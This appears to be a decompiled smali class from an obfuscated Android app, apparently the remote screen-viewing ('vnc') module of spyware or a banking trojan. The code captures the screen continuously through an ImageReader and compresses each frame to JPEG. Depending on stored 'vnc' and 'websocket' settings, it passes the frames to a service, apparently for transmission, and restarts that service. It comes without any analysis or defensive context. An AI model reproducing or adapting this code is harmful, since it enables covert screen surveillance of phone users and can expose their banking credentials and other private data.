.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/media/ImageReader$OnImageAvailableListener;


# annotations
.annotation build Landroid/annotation/TargetApi;
    value = 0x15
.end annotation


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field private final b:I

.field private final c:I

.field private final d:Landroid/media/ImageReader;

.field private final e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

.field private f:Landroid/graphics/Bitmap;


# direct methods
.method constructor <init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;)V
    .locals 5

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    invoke-virtual {p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->a()Landroid/view/WindowManager;

    move-result-object v0

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    new-instance v1, Landroid/graphics/Point;

    invoke-direct {v1}, Landroid/graphics/Point;-><init>()V

    invoke-virtual {v0, v1}, Landroid/view/Display;->getSize(Landroid/graphics/Point;)V

    iget v0, v1, Landroid/graphics/Point;->x:I

    iget v2, v1, Landroid/graphics/Point;->y:I

    const/16 v2, 0x320

    const/4 v3, 0x2

    if-lez v0, :cond_1

    if-gt v0, v2, :cond_1

    :cond_0
    iget v0, v1, Landroid/graphics/Point;->x:I

    div-int/2addr v0, v3

    iget v1, v1, Landroid/graphics/Point;->y:I

    div-int/2addr v1, v3

    goto :goto_0

    :cond_1
    const/16 v4, 0x640

    if-le v0, v2, :cond_2

    if-gt v0, v4, :cond_2

    iget v0, v1, Landroid/graphics/Point;->x:I

    div-int/lit8 v0, v0, 0x3

    iget v1, v1, Landroid/graphics/Point;->y:I

    div-int/lit8 v1, v1, 0x3

    goto :goto_0

    :cond_2
    if-le v0, v4, :cond_0

    iget v0, v1, Landroid/graphics/Point;->x:I

    div-int/lit8 v0, v0, 0x4

    iget v1, v1, Landroid/graphics/Point;->y:I

    div-int/lit8 v1, v1, 0x4

    :goto_0
    mul-int v2, v0, v1

    const/high16 v4, 0x100000

    if-le v2, v4, :cond_3

    shr-int/lit8 v0, v0, 0x1

    shr-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_3
    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->b:I

    iput v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->c:I

    const/4 v2, 0x1

    invoke-static {v0, v1, v2, v3}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->d:Landroid/media/ImageReader;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->d:Landroid/media/ImageReader;

    invoke-virtual {p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->b()Landroid/os/Handler;

    move-result-object p1

    invoke-virtual {v0, p0, p1}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method a()Landroid/view/Surface;
    .locals 1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->d:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v0

    return-object v0
.end method

.method b()I
    .locals 1

    iget v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->b:I

    return v0
.end method

.method c()I
    .locals 1

    iget v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->c:I

    return v0
.end method

.method public onImageAvailable(Landroid/media/ImageReader;)V
    .locals 5

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->d:Landroid/media/ImageReader;

    invoke-virtual {p1}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object p1

    if-eqz p1, :cond_6

    invoke-virtual {p1}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v2, v0, v1

    invoke-virtual {v2}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object v2

    aget-object v3, v0, v1

    invoke-virtual {v3}, Landroid/media/Image$Plane;->getPixelStride()I

    move-result v3

    aget-object v0, v0, v1

    invoke-virtual {v0}, Landroid/media/Image$Plane;->getRowStride()I

    move-result v0

    iget v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->b:I

    mul-int v4, v4, v3

    sub-int/2addr v0, v4

    iget v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->b:I

    div-int/2addr v0, v3

    add-int/2addr v4, v0

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v0

    if-ne v0, v4, :cond_0

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v0

    iget v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->c:I

    if-eq v0, v3, :cond_2

    :cond_0
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    :cond_1
    iget v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->c:I

    sget-object v3, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v4, v0, v3}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    :cond_2
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    invoke-virtual {v0, v2}, Landroid/graphics/Bitmap;->copyPixelsFromBuffer(Ljava/nio/Buffer;)V

    if-eqz p1, :cond_3

    invoke-virtual {p1}, Landroid/media/Image;->close()V

    :cond_3
    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {p1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->f:Landroid/graphics/Bitmap;

    iget v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->b:I

    iget v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->c:I

    invoke-static {v0, v1, v1, v2, v3}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object v0

    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v2, 0x64

    invoke-virtual {v0, v1, v2, p1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    const-string v2, "vnc"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "stop"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_5

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    const-string v2, "websocket"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    goto :goto_0

    :cond_4
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    invoke-virtual {v0, p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->a([B)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    const-class v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void

    :cond_5
    :goto_0
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->stopForeground(Z)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->a:Landroid/content/Intent;

    invoke-virtual {p1, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->stopService(Landroid/content/Intent;)Z

    :cond_6
    return-void
.end method
